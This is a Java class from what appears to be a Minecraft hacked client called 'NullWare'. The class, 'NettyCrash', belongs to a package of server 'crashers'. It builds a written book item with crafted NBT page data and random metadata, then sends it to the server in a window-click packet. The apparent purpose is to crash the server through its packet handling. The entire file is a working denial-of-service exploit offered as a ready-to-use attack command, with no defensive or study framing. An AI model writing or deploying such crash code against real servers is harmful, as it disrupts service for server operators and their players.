package com.Vxrtrauter.NullWare.command.commands.crashers;

import com.Vxrtrauter.NullWare.command.commands.CrashHandler;
import net.minecraft.client.Minecraft;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.play.client.C0EPacketClickWindow;
import org.apache.commons.lang3.RandomStringUtils;

public class NettyCrash implements CrashHandler {
    private final Minecraft mc = Minecraft.getMinecraft();

    @Override
    public void execute(int packets) {
        ItemStack writtenBook = new ItemStack(Items.written_book);
        NBTTagCompound comp = new NBTTagCompound();
        NBTTagList list = new NBTTagList();
        for (int i = 0; i < 100; i++) {
            list.appendTag(new NBTTagString("....."));
        }

        comp.setString("author", RandomStringUtils.randomAlphabetic(10));
        comp.setString("title", RandomStringUtils.randomAlphabetic(10));
        comp.setByte("resolved", (byte) 1);
        comp.setTag("pages", list);

        writtenBook.setTagCompound(comp);

        mc.getNetHandler().getNetworkManager().sendPacket(new C0EPacketClickWindow(0, 2, 0, 0, writtenBook, (short) 1));
    }
}